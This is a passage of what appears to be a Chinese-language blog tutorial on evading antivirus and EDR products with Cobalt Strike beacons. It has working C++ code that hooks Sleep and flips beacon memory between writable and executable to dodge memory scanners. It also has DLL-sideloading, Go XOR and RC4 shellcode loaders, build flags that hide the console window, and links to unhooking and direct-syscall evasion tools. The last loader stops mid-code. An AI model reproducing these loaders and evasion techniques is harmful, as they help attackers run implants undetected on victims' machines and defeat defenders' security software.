<h3 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h3><p>遍历当前内存页，匹配出带有执行权限的内存地址，标记后进行属性修改。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;MinHook.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">#if defined _M_X64</span><br><span class="line">#pragma comment(lib, &quot;libMinHook-x64-v141-mt.lib&quot;)</span><br><span class="line">#elif defined _M_IX86</span><br><span class="line">#pragma comment(lib, &quot;libMinHook-x86-v141-mt.lib&quot;)</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义内存页属性结构体</span><br><span class="line">struct MemoryAttrib &#123;</span><br><span class="line">    LPVOID address;		&#x2F;&#x2F; 内存地址</span><br><span class="line">    DWORD size;			&#x2F;&#x2F; 内存大小</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义内存信息结构体</span><br><span class="line">struct MemoryInfo &#123;</span><br><span class="line">    MemoryAttrib memoryPage[4];	&#x2F;&#x2F; 能找到符合条件的目标内存最多3个</span><br><span class="line">    int index &#x3D; 0;					&#x2F;&#x2F; 内存下标</span><br><span class="line">    unsigned char* key;		&#x2F;&#x2F; 加解密key</span><br><span class="line">    BOOL isScanMemory &#x3D; FALSE;			&#x2F;&#x2F; 是否已查找内存页信息</span><br><span class="line">    BOOL iscleaned &#x3D; FALSE;				&#x2F;&#x2F;是否清除之前的beacon和shellcode遗留</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">MemoryInfo memoryInfo;</span><br><span class="line"></span><br><span class="line">&#x2F;*-------------------------misc func----------------------------------*&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 删除 shellcode 和 加密beacon</span><br><span class="line">void DeleteOther()</span><br><span class="line">&#123;</span><br><span class="line">    MemoryAttrib shellcode &#x3D; memoryInfo.memoryPage[memoryInfo.index - 3];</span><br><span class="line">    MemoryAttrib enc_beacon &#x3D; memoryInfo.memoryPage[memoryInfo.index - 2];</span><br><span class="line">    printf(&quot;[+]shellcode Address at 0x%p\n&quot;, shellcode.address);</span><br><span class="line">    printf(&quot;[+]enc_beacon Address at 0x%p\n&quot;, enc_beacon.address);</span><br><span class="line">    &#x2F;&#x2F; 0填充</span><br><span class="line">    RtlSecureZeroMemory(shellcode.address, shellcode.size);</span><br><span class="line">    RtlSecureZeroMemory(enc_beacon.address, enc_beacon.size);</span><br><span class="line">    DWORD oldProt;</span><br><span class="line">    &#x2F;&#x2F;修改属性</span><br><span class="line">    VirtualProtect(shellcode.address, shellcode.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class="line">    VirtualProtect(enc_beacon.address, enc_beacon.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class="line">    memoryInfo.iscleaned &#x3D; TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 扫描内存中带有X属性的内存并标记</span><br><span class="line">void ScanMemoryMap()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 内存块信息结构体</span><br><span class="line">    MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line"></span><br><span class="line">    LPVOID lpAddress &#x3D; 0;</span><br><span class="line">    HANDLE hProcess &#x3D; OpenProcess(MAXIMUM_ALLOWED, FALSE, GetCurrentProcessId());</span><br><span class="line">    int* index &#x3D; &amp;memoryInfo.index;</span><br><span class="line"></span><br><span class="line">    while (VirtualQueryEx(hProcess, lpAddress, &amp;mbi, sizeof(mbi)))</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; 查找 RWX &#x2F; X &#x2F;RX</span><br><span class="line">        if (mbi.Protect &#x3D;&#x3D; PAGE_EXECUTE_READWRITE || mbi.Protect &#x3D;&#x3D; PAGE_EXECUTE || mbi.Protect &#x3D;&#x3D; PAGE_EXECUTE_READ &amp;&amp; mbi.Type &#x3D;&#x3D; MEM_PRIVATE)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; 保存内存信息</span><br><span class="line">            memoryInfo.memoryPage[*index].address &#x3D; mbi.BaseAddress;</span><br><span class="line">            memoryInfo.memoryPage[*index].size &#x3D; (DWORD)mbi.RegionSize;</span><br><span class="line">            printf(&quot;[%d]扫描到地址: 0x%p\n&quot;, *index, memoryInfo.memoryPage[*index].address);</span><br><span class="line">            (*index)++;</span><br><span class="line"></span><br><span class="line">            if ((*index) &gt;&#x3D; 4)</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 更新到下一个内存页</span><br><span class="line">        lpAddress &#x3D; (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);</span><br><span class="line">    &#125;</span><br><span class="line">    memoryInfo.isScanMemory &#x3D; TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*-------------------------define hook func----------------------------------*&#x2F;</span><br><span class="line">void (WINAPI* OldSleep)(DWORD dwMiliseconds);</span><br><span class="line"></span><br><span class="line">void (WINAPI MyHookedSleep)(DWORD dwMiliseconds);</span><br><span class="line"></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">inline MH_STATUS MH_CreateHookApiEx(</span><br><span class="line">    LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)</span><br><span class="line">&#123;</span><br><span class="line">    return MH_CreateHookApi(</span><br><span class="line">        pszModule, pszProcName, pDetour, reinterpret_cast&lt;LPVOID*&gt;(ppOriginal));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL Hook()</span><br><span class="line">&#123;</span><br><span class="line">    if (MH_Initialize() !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class="line">    &#x2F;&#x2F;Sleep</span><br><span class="line">    if (MH_CreateHookApiEx(L&quot;kernel32&quot;, &quot;Sleep&quot;, &amp;MyHookedSleep, &amp;OldSleep) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class="line">    if (MH_EnableHook(MH_ALL_HOOKS) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*-------------------------my hook func--------------------------------*&#x2F;</span><br><span class="line">void WINAPI MyHookedSleep(DWORD dwMiliseconds)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD oldProt;</span><br><span class="line">    if (!memoryInfo.isScanMemory) &#123;</span><br><span class="line">        ScanMemoryMap();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!memoryInfo.iscleaned) &#123;</span><br><span class="line">        DeleteOther();</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD time &#x3D; dwMiliseconds;</span><br><span class="line">    if (time &gt; 1000) &#123;</span><br><span class="line">        MemoryAttrib beacon &#x3D; memoryInfo.memoryPage[memoryInfo.index - 1];</span><br><span class="line">        &#x2F;&#x2F;DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class="line">        printf(&quot;[+]修改beacon属性为RW: address 0x%p\n&quot;, beacon.address);</span><br><span class="line">        VirtualProtect(beacon.address, beacon.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class="line">        &#x2F;&#x2F;HeapEncryptDecrypt();</span><br><span class="line"></span><br><span class="line">        OldSleep(dwMiliseconds);</span><br><span class="line">        printf(&quot;[+]修改beacon属性为RX: address 0x%p\n&quot;, beacon.address);</span><br><span class="line">        VirtualProtect(beacon.address, beacon.size, PAGE_EXECUTE_READ, &amp;oldProt);</span><br><span class="line">        &#x2F;&#x2F;HeapEncryptDecrypt();</span><br><span class="line">        &#x2F;&#x2F;DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        OldSleep(time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*-------------------------main--------------------------------*&#x2F;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    if (!Hook()) &#123;return 1; &#125;</span><br><span class="line">    unsigned char buf[] &#x3D; &quot;\xfc\xe8\x89\x00\x00\x00&quot;;</span><br><span class="line"></span><br><span class="line">    const size_t length &#x3D; sizeof(buf);</span><br><span class="line">    void* shellcode &#x3D; VirtualAlloc(NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(shellcode, buf, length);</span><br><span class="line">    ((void(*)(void)) shellcode)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果图：sleep时，beacon属性为RW</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240515153954755.png" alt="image-20240515153954755"></p>
<p>没有sleep时，属性为RW+RX三部分</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240515154122799.png" alt="image-20240515154122799"></p>
<p>Ref：<a target="_blank" rel="noopener" href="https://github.com/mgeeky/ShellcodeFluctuation">ShellcodeFluctuation</a>、<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12701?time__1311=mqmhDvox8GOD/D0lD2DUh4fhBFeM2rwD">Cobalt Strike与YARA：我能拥有你的签名吗？</a>、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkxMTMxMjI2OQ==&mid=2247484016&idx=1&sn=c788a9a63f3db2f2e7a11f3c82534281&chksm=c11f5692f668df84677a4fe2bff5ea3104f9e349533d0e70815c246edf89c53cd27922cdef43&scene=178&cur_album_id=2280727834220429320#rd">Beacon sleep_mask 分析</a>、<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/blog/cobalt-strike-4-4-the-one-with-the-reconnect-button">Cobalt Strike 4.4: The One with the Reconnect Button</a>、<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274676.htm">CobaltStrike检测与对抗</a>、<a target="_blank" rel="noopener" href="https://www.arashparsa.com/catching-a-malware-with-no-name/">Analyzing Malware with Hooks, Stomps, and Return-addresses</a>、<a target="_blank" rel="noopener" href="https://oxis.github.io/GPUSleep/">GPUSleep. Makes your beacon disappear into GPU memory</a></p>
<h2 id="栈欺骗"><a href="#栈欺骗" class="headerlink" title="栈欺骗"></a>栈欺骗</h2><p>能力之外：</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzk0NTUwNzAyOA==&mid=2247483991&idx=1&sn=726883083a2ae0c4c33359a1c58324fb&chksm=c3151decf46294faabbcb33c6ebc78f083ec1a40500afabfedf67c8fe65687b38007846b5db1&scene=126&sessionid=1698330378&key=98b23746bc43506087e78253d823e63912c74cdda7d97957c104dbfde02ef56562289ae43f8f1071a4eae6991081caa559ba450eba5d6675fc1e4465dda302207ea7811c47c64e4ed1ce6bbc7ecc08ca27aa2ea2f67552c9aaab108b9e262a7bc13ce7c24ecde47c4ff97300532c7900c9661d7aeda707754882640febb30991&ascene=15&uin=MzgxODQ4MjMz&devicetype=Windows+10+x64&version=63060012&lang=zh_CN&session_us=gh_183ba3e9a2da&countrycode=GY&exportkey=n_ChQIAhIQd3qUEWSakepdJdInpn+HPRLvAQIE97dBBAEAAAAAAAEAFgxiFOsAAAAOpnltbLcz9gKNyK89dVj0aGYW1jtewsyXFFBTLHMdxvcZfewW8vHrEIattaVm0UTj0AIlGlbxX2RWBGo/rB7uauz9/4qnReipfVTgrmwvV2VBid9d8GtC/7TnNenqy9j2GhB0RSgzxsjAnY0GelrpfTymDg+C9f1afYsEy6Nllaef/ioEnBRzk8JJBKLPEnJM1j5MwuoLcHQo2Wnjt379MPM2r7FEQqqciTK3cR2kpbcWikH2PcwXsDis1FDvwg2mkMMDIJIeM8W8X5mL3ItCcAAOzFnDfvV5&acctmode=0&pass_ticket=7M9Jv6ZxglLxMB7GtRyi4WlVHFCf3labClIm+0tqJ4xzN2VRO8/dUPM0tpg5TJWZ&wx_header=0&fontgear=2">调用栈欺骗技术</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14487?time__1311=mqmx9QD=Dt0QO405DIYYK0=Fi=L6Kkdh7bD">初探堆栈欺骗之静态欺骗</a></p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/kyleavery/AceLdr">kyleavery/AceLdr: Cobalt Strike UDRL for memory scanner evasion</a>  涵盖以上所有bypass。</p>
<h1 id="行为对抗免杀"><a href="#行为对抗免杀" class="headerlink" title="行为对抗免杀"></a>行为对抗免杀</h1><p>杀软目前都有主动防御，对恶意行为进行拦截提示，比如这些行为：</p>
<ul>
<li><p>注册表操作、添加启动项、添加服务</p>
</li>
<li><p>文件写入、读系统文件、删除文件、移动文件</p>
</li>
<li><p>杀进程、创建进程、加载dll</p>
</li>
<li><p>注入、劫持等</p>
</li>
</ul>
<p>如下几种bypass</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 替换API</span><br><span class="line">使用相同功能的API进行替换，由于杀软只会针对一部分API进行拦截，对于API不能做到面面俱到的拦截，比如未导出API和底层API，所以这种方法还是有效的。</span><br><span class="line"></span><br><span class="line">2. 重写API</span><br><span class="line">完全重写系统的API功能，实现自己的对应功能API，对ring3的行为拦截非常有效。</span><br><span class="line"></span><br><span class="line">3. 合理更改调用顺序</span><br><span class="line">有时被拦截的行为是通过多个API组合来完成的，所以合理替换顺序，绕过杀软的拦截策略，也可以绕过行为拦截</span><br><span class="line"></span><br><span class="line">4. 绕过调用源</span><br><span class="line">直接调用0环API。</span><br></pre></td></tr></table></figure>

<p>关于行为对抗，我建议借鉴学习该项目：<a target="_blank" rel="noopener" href="https://github.com/yanghaoi/CobaltStrike_CNA">CobaltStrike_CNA</a>，在cs上使用 <code>net user admin /delete</code> 就会被拦截，看一下该项目是怎么绕过的：</p>
<p>通过使用cs的反射dll技术，调用 reflective_dll.dll</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240516145945893.png" alt="image-20240516145945893"></p>
<p>调用的是 <code>NetUserAdd</code> API，比较常见的api了</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240516150042665.png" alt="image-20240516150042665"></p>
<p>[利用ReflectiveDLL来武装你的Cobalt Strike](<a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/%E5%88%A9%E7%94%A8ReflectiveDLL%E6%9D%A5%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84Cobalt">https://uknowsec.cn/posts/notes/利用ReflectiveDLL来武装你的Cobalt</a> Strike.html)</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/264890">一些绕过AV进行UserAdd的方法总结及实现</a></p>
<h1 id="unhook-API"><a href="#unhook-API" class="headerlink" title="unhook API"></a>unhook API</h1><p>目的就是获取纯净的 ntdll 以避免 API 函数被hook。</p>
<p>四种方式：</p>
<ul>
<li>磁盘重载 ntdll</li>
<li>PE 文件映射</li>
<li>挂起的进程获取干净的ntdll</li>
<li>自定义直接跳转</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fdxsec/p/18146252">几种unhook手法的学习 - fdx_xdf</a></p>
<p><a target="_blank" rel="noopener" href="https://killer.wtf/2022/01/19/CustomJmpUnhook.html">自定义跳转函数的unhook方法</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xf555er/article/details/132439629">Hook免杀实战: 去除杀软的三环钩子_unhook 免杀</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9493?time__1311=n4+xuDgD9ALxBGDlxGrbDyiDclDnjhZlDYT+D">bypass Bitdefender</a></p>
<p><a target="_blank" rel="noopener" href="https://shells.systems/defeat-bitdefender-total-security-using-windows-api-unhooking-to-perform-process-injection/">Defeat Bitdefender total security using windows API unhooking to perform process injection - Shells.Systems</a></p>
<p>项目：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/fdx-xdf/LdrLoadDll-Unhooking-x86-x64/blob/main/unhook.cpp">LdrLoadDll-Unhooking-x86-x64/unhook.cpp at main · fdx-xdf/LdrLoadDll-Unhooking-x86-x64</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/dosxuz/PerunsFart">PerunsFart: This is my own implementation of the Perun’s Fart technique by Sektor7</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/optiv/Freeze">/Freeze: Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods</a></p>
<h1 id="SYSCALL"><a href="#SYSCALL" class="headerlink" title="SYSCALL"></a>SYSCALL</h1><p>简单来说就是跳过api函数调用，直接通过SSN号，利用syscall，直接在内核操作，避免使用API函数。具体原理细节讲不懂。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240516214827068.png" alt="image-20240516214827068"></p>
<p>总结：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">首先，为了防止 api 被 hook，提出了 syscall 函数，这产生了地狱之门的项目，然而，当 ntdll 被 hook 时，这种方法就失效了，因此出现了更高级的技术，如“光环之门”，试图通过邻居来获取系统调用号（SSN）。然而，即使获取了 SSN，仍然有可能被安全软件检测到，因为系统调用的签名（sysall）可能会被查杀。为了解决这个问题，出现了“egg_hunter”等技术。但是堆栈的问题还没有解决，我们需要合法的堆栈， SysWhispers2 和 SysWhispers3，它们提出了间接系统调用的方案，进一步提高了对系统调用的隐藏性和逃避性，使得安全工具更难检测到和拦截这些调用</span><br></pre></td></tr></table></figure>

<p>Ref：</p>
<p><a target="_blank" rel="noopener" href="http://www.qfrost.com/posts/windowskernel/windows%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_2/">Windows系统调用学习笔记（2）3环进0环</a></p>
<p><a target="_blank" rel="noopener" href="https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav">通过重写ring3 API函数实现免杀</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fdxsec/p/18029158">Syscall笔记 - fdx_xdf</a></p>
<p><a target="_blank" rel="noopener" href="https://ryze-t.com/2021/12/01/%E6%B5%85%E8%B0%88-Syscall/">浅谈 Windows Syscall</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/15961380.html">API函数的调用过程(三环到零环)以及重写WriteProcessMemory三环</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-279538.htm">SysWhispers3学习</a></p>
<p>项目：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/klezVirus/SysWhispers3">SysWhispers3: SysWhispers on Steroids - AV/EDR evasion via direct system calls</a></p>
<h1 id="白加黑"><a href="#白加黑" class="headerlink" title="白加黑"></a>白加黑</h1><p>之前写过一篇关于dll劫持的白加黑：<a target="_blank" rel="noopener" href="http://www.y0ng.top/2023/12/25/DLL%E5%8A%AB%E6%8C%81/">初探DLL劫持</a>，再推个项目吧：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Neo-Maoku/SearchAvailableExe">SearchAvailableExe: 寻找可利用的白文件</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Neo-Maoku/DllMainHijacking">https://github.com/Neo-Maoku/DllMainHijacking</a></p>
<p>报错的话转发处理下就行了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void runShellcode() &#123;</span><br><span class="line">    string data &#x3D; &quot;37bcc518419......&quot;;  &#x2F;&#x2F; rc4加密</span><br><span class="line"></span><br><span class="line">    const size_t length &#x3D; data.size() &#x2F; 2;</span><br><span class="line">    unsigned char* buf &#x3D; (unsigned char*)malloc(length);</span><br><span class="line">    &#x2F;&#x2F; 调用函数将十六进制字符串转换为字节型数组</span><br><span class="line">    ToBytes(data, buf, length);</span><br><span class="line">    unsigned char key[] &#x3D; &quot;key is here&quot;;</span><br><span class="line">    enc_dec(key, buf);</span><br><span class="line">    LPVOID shellcode &#x3D; VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, 0x40);</span><br><span class="line"></span><br><span class="line">    memcpy(shellcode, buf, length);</span><br><span class="line"></span><br><span class="line">    void(*func)();</span><br><span class="line">    func &#x3D; (void(*)())shellcode;</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240517122818922.png" alt="image-20240517122818922"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240517143734080.png" alt="image-20240517143734080"></p>
<p>Ref：<a target="_blank" rel="noopener" href="https://saucer-man.com/information_security/1171.html">https://saucer-man.com/information_security/1171.html</a></p>
<h1 id="堆栈溢出"><a href="#堆栈溢出" class="headerlink" title="堆栈溢出"></a>堆栈溢出</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14405?time__1311=mqmx9QD=0=0Q5GNDQiiQL3AKgRD0O7BRiD&alichlgref=https://xz.aliyun.com/u/83539#toc-0">无Windows API的新型恶意程序：自缺陷程序利用堆栈溢出的隐匿稳定攻击技术研究</a></p>
<p>是个思路，但是有dll的话不如用白加黑。</p>
<h1 id="临时免杀"><a href="#临时免杀" class="headerlink" title="临时免杀"></a>临时免杀</h1><h2 id="golang-syscall"><a href="#golang-syscall" class="headerlink" title="golang syscall"></a>golang syscall</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;syscall&quot;</span><br><span class="line">	&quot;unsafe&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; shellcode is here</span><br><span class="line">	data :&#x3D; []byte&#123;0x56, 0xe2,......&#125;</span><br><span class="line">	key :&#x3D; byte(0xAA)</span><br><span class="line"></span><br><span class="line">	 &#x2F;&#x2F; 解密shellcode</span><br><span class="line">	for i :&#x3D; 0; i &lt; len(data); i++ &#123;</span><br><span class="line">		data[i] ^&#x3D; key</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; 加载动态链接库</span><br><span class="line">	kernel32, err :&#x3D; syscall.LoadLibrary(&quot;kernel32.dll&quot;)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	defer syscall.FreeLibrary(kernel32)</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 获取 VirtualAlloc 函数地址</span><br><span class="line">	virtualAlloc, err :&#x3D; syscall.GetProcAddress(kernel32, &quot;VirtualAlloc&quot;)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 获取 RtlMoveMemory 函数地址</span><br><span class="line">	ntdll, err :&#x3D; syscall.LoadLibrary(&quot;ntdll.dll&quot;)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	defer syscall.FreeLibrary(ntdll)</span><br><span class="line"></span><br><span class="line">	rtlMoveMemory, err :&#x3D; syscall.GetProcAddress(ntdll, &quot;RtlMoveMemory&quot;)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 调用 VirtualAlloc 分配内存</span><br><span class="line">	mem, _, err :&#x3D; syscall.Syscall6(uintptr(virtualAlloc), 4,</span><br><span class="line">		0,               &#x2F;&#x2F; lpAddress (0 for system to determine)</span><br><span class="line">		uintptr(4096),   &#x2F;&#x2F; dwSize (size of allocation)</span><br><span class="line">		uintptr(0x1000), &#x2F;&#x2F; flAllocationType (commit reserved pages)</span><br><span class="line">		uintptr(0x40),   &#x2F;&#x2F; flProtect (PAGE_EXECUTE_READWRITE)</span><br><span class="line">		0, 0)</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 执行shellcode</span><br><span class="line">	_, _, err &#x3D; syscall.Syscall6(uintptr(rtlMoveMemory), 3,</span><br><span class="line">		mem,                               &#x2F;&#x2F; Destination</span><br><span class="line">		uintptr(unsafe.Pointer(&amp;data[0])), &#x2F;&#x2F; Source</span><br><span class="line">		uintptr(len(data)),                &#x2F;&#x2F; Length</span><br><span class="line">		0, 0, 0)</span><br><span class="line">	</span><br><span class="line">	syscall.Syscall(mem, 0, 0, 0, 0)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>enc.go</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;encoding&#x2F;hex&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;strings&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	&#x2F;&#x2F; 要加密的数据</span><br><span class="line">	dataHex :&#x3D; &#96;shellcode is here&#96;</span><br><span class="line"></span><br><span class="line">	dataHex &#x3D; strings.ReplaceAll(dataHex, &quot;\t&quot;, &quot;&quot;)</span><br><span class="line">	dataHex &#x3D; strings.ReplaceAll(dataHex, &quot;\n&quot;, &quot;&quot;)</span><br><span class="line">	dataHex &#x3D; strings.ReplaceAll(dataHex, &quot;\\x&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 解析十六进制字符串为字节切片</span><br><span class="line">	data, err :&#x3D; hex.DecodeString(dataHex)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(&quot;解析十六进制字符串失败:&quot;, err)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 加密密钥</span><br><span class="line">	key :&#x3D; byte(0xAA)</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 加密数据</span><br><span class="line">	for i :&#x3D; 0; i &lt; len(data); i++ &#123;</span><br><span class="line">		data[i] ^&#x3D; key</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 将加密后的内容按 \x 格式输出</span><br><span class="line">	encryptedString :&#x3D; &quot;&quot;</span><br><span class="line">	for _, b :&#x3D; range data &#123;</span><br><span class="line">		encryptedString +&#x3D; fmt.Sprintf(&quot;\\x%02x&quot;, b)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(&quot;加密后的内容：&quot;, encryptedString)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go build -ldflags &quot;-H windowsgui&quot; main.go</span><br></pre></td></tr></table></figure>

<h2 id="c-rc4"><a href="#c-rc4" class="headerlink" title="c++ rc4"></a>c++ rc4</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &quot;lazy_importer.hpp&quot;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">#pragma comment(linker,&quot;&#x2F;subsystem:\&quot;windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line"></span><br><span class="line">#define size_b 256</span><br><span class="line">unsigned char sbox[257] &#x3D; &#123; 0 &#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;初始化s表</span><br><span class="line">void init_sbox(unsigned char* key) &#123;</span><br><span class="line">    unsigned int i, j, k;</span><br><span class="line">    int tmp;</span><br><span class="line">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class="line">        sbox[i] &#x3D; i;</span><br><span class="line">    &#125;</span><br><span class="line">    j &#x3D; k &#x3D; 0;</span><br><span class="line">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class="line">        tmp &#x3D; sbox[i];</span><br><span class="line">        j &#x3D; (j + tmp + key[k]) % size_b;</span><br><span class="line">        sbox[i] &#x3D; sbox[j];</span><br><span class="line">        sbox[j] &#x3D; tmp;</span><br><span class="line">        if (++k &gt;&#x3D; strlen((char*)key))k &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;加解密函数</span><br><span class="line">void AES_enc(unsigned char* key, unsigned char* data) &#123;</span><br><span class="line">    int i, j, k, R, tmp;</span><br><span class="line">    init_sbox(key);</span><br><span class="line"></span><br><span class="line">    j &#x3D; k &#x3D; 0;</span><br><span class="line">    for (i &#x3D; 0; i &lt; strlen((char*)data); i++) &#123;</span><br><span class="line">        j &#x3D; (j + 1) % size_b;</span><br><span class="line">        k &#x3D; (k + sbox[j]) % size_b;</span><br><span class="line"></span><br><span class="line">        tmp &#x3D; sbox[j];</span><br><span class="line">        sbox[j] &#x3D; sbox[k];</span><br><span class="line">        sbox[k] &#x3D; tmp;</span><br><span class="line"></span><br><span class="line">        R &#x3D; sbox[(sbox[j] + sbox[k]) % size_b];</span><br><span class="line"></span><br><span class="line">        data[i] ^&#x3D; R;</span><br><span 